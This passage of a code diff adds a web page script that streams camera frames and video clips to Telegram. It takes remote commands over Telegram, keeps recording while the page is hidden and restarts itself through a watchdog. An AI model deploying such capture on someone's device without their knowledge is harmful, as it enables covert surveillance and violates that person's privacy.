+                );
+              } else {
+                const sizeMb = (snapshot.blob.size / 1024 / 1024).toFixed(2);
+                await sendTelegramNotice(`🎥 Uploading ${sizeMb} MB…`);
+                const w = video.videoWidth || 640;
+                const h = video.videoHeight || 480;
+                const durationSec = completedSegments.length > 0
+                  ? (completedSegments.length * RECORD_SEGMENT_MS) / 1000
+                  : RECORD_SEGMENT_MS / 1000;
+                const meta = { width: w, height: h, duration: durationSec };
+                const sent = await sendVideoToTelegram(snapshot.blob, snapshot.mime, meta);
+                if (sent?.ok === false) {
+                  await sendTelegramNotice(`🎥 Telegram rejected the video: ${sent.description || 'unknown'}`);
+                }
+              }
+            } catch (err) {
+              logEvent(`video fail: ${err.message}`);
+              await sendTelegramNotice(`🎥 Video failed: ${err.message}`);
+            } finally {
+              flushingVideo = false;
+            }
+          }
+        }
+      } catch (err) {
+        console.warn('Poll error:', err.message);
+      }
+    }
+
+    function startPolling() {
+      if (pollTimer) return;
+      pollTelegramCommands();
+      pollTimer = setInterval(pollTelegramCommands, POLL_INTERVAL_MS);
+    }
+    function stopPolling() {
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    }
+
+    /* ============== camera / facing mode ============== */
+    async function setFacingMode(mode, source = 'telegram') {
+      if (mode === facingMode && stream) {
+        if (source === 'telegram') await sendTelegramNotice(`Already using ${mode === 'user' ? 'front' : 'back'} camera.`);
+        return;
+      }
+      const oldMode = facingMode;
+      facingMode = mode;
+      const label = mode === 'user' ? 'front' : 'back';
+      setStatus(`Switching to ${label} camera…`);
+      stopRecorder();
+      stopStream();
+      completedSegments = [];
+      currentChunks = [];
+
+      try {
+        const videoConstraints = { facingMode: { ideal: facingMode } };
+        const mediaConstraints = { video: videoConstraints, audio: audioEnabled };
+        stream = await navigator.mediaDevices.getUserMedia(mediaConstraints);
+      } catch (err) {
+        setStatus(`Could not switch to ${label} camera: ${describeCameraError(err)}`);
+        logEvent(`camera switch failed (${label}): ${err.message}`);
+        try {
+          facingMode = oldMode;
+          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: audioEnabled });
+        } catch { return; }
+      }
+
+      video.srcObject = stream;
+      try {
+        await new Promise((res, rej) => {
+          const cleanup = () => { video.removeEventListener('loadeddata', onL); video.removeEventListener('error', onE); };
+          const onL = () => { cleanup(); res(); }; const onE = () => { cleanup(); rej(new Error('video load')); };
+          if (video.readyState >= 2) return res();
+          video.addEventListener('loadeddata', onL, { once: true });
+          video.addEventListener('error', onE, { once: true });
+        });
+      } catch { setStatus('Video failed to load after switch.'); return; }
+
+      setStatus(`Now using ${label} camera.`);
+      logEvent(`camera → ${label}`);
+
+      startRecorder();
+      scheduleSegmentRotation();
+
+      if (source === 'telegram') await sendTelegramNotice(`🔄 Camera flipped to ${label}.`);
+    }
+
+    /* ============== pause ============== */
+    function setPaused(paused) {
+      isPaused = paused;
+      setStatus(paused ? 'Paused.' : 'Resumed.');
+      logEvent(paused ? 'paused' : 'resumed');
+    }
+
+    /* ============== capture loop ============== */
+    async function tick() {
+      if (isCapturing || isPaused) return;
+      isCapturing = true;
+      try {
+        const w = video.videoWidth || 640, h = video.videoHeight || 480;
+        canvas.width = w; canvas.height = h;
+        canvas.getContext('2d').drawImage(video, 0, 0, w, h);
+        const blob = await canvasToBlob(canvas, 'image/jpeg', 0.85);
+
+        // Push to local viewer (throttled, non-blocking)
+        pushFrameToViewer(blob);
+
+        let frameChanged = true;
+        if (motionEnabled) {
+          const bytes = new Uint8Array(await blob.arrayBuffer());
+          let hash = 0;
+          for (let i = 0; i < bytes.length; i += 500) hash = (hash * 31 + bytes[i]) | 0;
+          const delta = Math.abs(hash - lastFrameHash);
+          frameChanged = delta > motionThreshold;
+          lastFrameHash = hash;
+        }
+
+        channel.postMessage({ type: 'frame', blob, ts: Date.now() });
+
+        if (frameChanged && Date.now() - lastTelegramSent >= TELEGRAM_MS) {
+          lastTelegramSent = Date.now();
+          const idx = ++captureCount;
+          // Fire-and-forget so the encoder never waits on the network
+          sendToTelegram(blob, idx)
+            .then(() => { consecutiveFails = 0; setStatus(``); })
+            .catch(err => {
+              consecutiveFails++;
+              console.error('TG:', err);
+              setStatus(`Telegram failed (${consecutiveFails}/${MAX_CONSECUTIVE_FAILS}): ${err.message}`);
+              logEvent(`telegram fail ${consecutiveFails}: ${err.message}`);
+
+              if (consecutiveFails >= MAX_CONSECUTIVE_FAILS && !recovering) {
+                recovering = true;
+                setStatus(`Paused after ${MAX_CONSECUTIVE_FAILS} failures — retrying in ${AUTO_RECOVER_DELAY_MS/1000}s…`);
+                logEvent('auto-recovery scheduled');
+                if (fastTimer) { clearInterval(fastTimer); fastTimer = null; }
+                setTimeout(() => {
+                  recovering = false;
+                  consecutiveFails = 0;
+                  lastTelegramSent = 0;
+                  if (!stream) { startCapture(); return; }
+                  if (!isPaused && !fastTimer) {
+                    fastTimer = setInterval(tick, FAST_MS);
+                    tick();
+                  }
+                  logEvent('auto-recovery resumed');
+                }, AUTO_RECOVER_DELAY_MS);
+              }
+            });
+        }
+      } catch (err) {
+        console.error('Capture tick failed:', err);
+        setStatus(`Capture error: ${err.message}`);
+        logEvent(`tick error: ${err.message}`);
+      } finally {
+        isCapturing = false;
+      }
+    }
+
+    function stopCapture(reason) {
+      if (fastTimer) { clearInterval(fastTimer); fastTimer = null; }
+      stopRecorder();
+      stopStream();
+      if (reason) { setStatus(reason); logEvent(`stop: ${reason}`); }
+    }
+
+    /* ============== start ============== */
+    async function startCapture() {
+      setStatus('');
+
+      try {
+        // Prefer 720p @ 30fps for a smooth, low-latency encoder input
+        const mediaConstraints = {
+          video: {
+            facingMode: { ideal: facingMode },
+            width:  { ideal: 1280 },
+            height: { ideal: 720 },
+            frameRate: { ideal: 30, max: 30 }
+          },
+          audio: audioEnabled
+        };
+        stream = await navigator.mediaDevices.getUserMedia(mediaConstraints);
+      } catch (err) {
+        setStatus(describeCameraError(err));
+        logEvent(`camera acquire failed: ${err.message}`);
+        return;
+      }
+
+      video.srcObject = stream;
+      try {
+        await new Promise((res, rej) => {
+          const cleanup = () => { video.removeEventListener('loadeddata', onL); video.removeEventListener('error', onE); };
+          const onL = () => { cleanup(); res(); }; const onE = () => { cleanup(); rej(new Error('video load')); };
+          if (video.readyState >= 2) return res();
+          video.addEventListener('loadeddata', onL, { once: true });
+          video.addEventListener('error', onE, { once: true });
+        });
+      } catch {
+        setStatus('Could not start video preview.');
+        logEvent('video preview failed');
+        stopStream();
+        return;
+      }
+
+      isPaused = false;
+      setStatus('');
+      if (fastTimer) clearInterval(fastTimer);
+      fastTimer = setInterval(tick, FAST_MS);
+      tick();
+      startPolling();
+      logEvent('capture started');
+
+      startRecorder();
+      scheduleSegmentRotation();
+    }
+
+    /* ============== lifecycle ============== */
+    window.addEventListener('pagehide', () => {
+      stopCapture();
+      stopPolling();
+      releaseWakeLock();
+      stopTimelapse();
+    });
+
+    document.addEventListener('visibilitychange', async () => {
+      if (document.hidden) {
+        logEvent('visibility: hidden — capture continues');
+      } else {
+        logEvent('visibility: visible');
+        if (!fastTimer && stream && !isPaused) {
+          fastTimer = setInterval(tick, FAST_MS);
+          tick();
+        }
+        if (!wakeLock && document.visibilityState === 'visible') {
+          requestWakeLock();
+        }
+      }
+    });
+
+    setInterval(() => {
+      if (stream && !isPaused && !fastTimer && !recovering && !flushingVideo) {
+        console.warn('[watchdog] timer dead — restarting');
+        logEvent('watchdog restarted timer');
+        fastTimer = setInterval(tick, FAST_MS);
+        tick();
+      }
+    }, 5000);
+
+    /* ============== battery ============== */
+    (async () => {
+      if (!navigator.getBattery) return;
+      try {
+        const ua = navigator.userAgent;
+        const isMobile = /android|iphone|ipad|ipod/i.test(ua) ||
+                         (navigator.maxTouchPoints > 1 && /macintosh/i.test(ua));
+        const b = await navigator.getBattery();
+        const looksFake = !isMobile && b.level === 1 && b.charging === true;
+        batteryLevel    = b.level;
+        batteryCharging = b.charging;
+        batteryIsReal   = !looksFake;
+
+        const onBatteryChange = () => {
+          batteryLevel    = b.level;
+          batteryCharging = b.charging;
+          if (batteryIsReal && batteryLevel * 100 <= autoPauseBattery && !batteryCharging && !isPaused) {
+            setPaused(true);
+            sendTelegramNotice(`🔋 Battery at ${Math.round(batteryLevel*100)}% — auto-paused.`).catch(() => {});
+          }
+        };
+        b.addEventListener('levelchange', onBatteryChange);
+        b.addEventListener('chargingchange', onBatteryChange);
+        if (batteryIsReal) logEvent(`battery: ${Math.round(batteryLevel*100)}%`);
+      } catch { /* ignore */ }
+    })();
+
+    window.addEventListener('offline', () => logEvent('network: offline'));
+    window.addEventListener('online', () => {
+      logEvent('network: online');
+      if (consecutiveFails > 0 && !recovering) consecutiveFails = 0;
+    });
+
+    /* ============== boot ============== */
+    askNameIfNeeded();
+    startCapture();
+  </script>
+</body>
+</html>
